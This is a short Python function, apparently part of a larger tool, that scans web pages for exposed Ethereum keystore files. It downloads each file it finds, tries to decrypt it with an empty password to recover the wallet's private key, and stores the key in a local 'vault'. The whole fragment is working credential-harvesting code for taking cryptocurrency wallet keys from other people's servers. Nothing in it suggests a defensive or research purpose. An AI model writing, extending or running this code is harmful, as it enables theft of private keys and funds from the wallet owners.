# Ethereum Keystore Scanner
# ========================
def scan_for_ethereum_keystores(html, base_url):
    matches = re.findall(r"UTC--[0-9T\-]+--.*\.json", html)
    for filename in matches:
        full_url = urljoin(base_url, filename)
        try:
            response = requests.get(full_url)
            if response.status_code == 200:
                try:
                    key_data = response.json()
                    private_key_hex = decode_keyfile_json(key_data, b"")  # Try empty password
                    if private_key_hex:
                        print(f"[+] Found Ethereum keystore: {full_url}")
                        encrypted = encrypt_private_key(DEFAULT_PASSWORD, private_key_hex)
                        save_to_vault({
                            "type": "ethereum-keystore",
                            "source": full_url,
                            "encrypted": encrypted
                        })
                except Exception as e:
                    print(f"[!] Not valid Ethereum keystore: {full_url}")
        except:
            pass

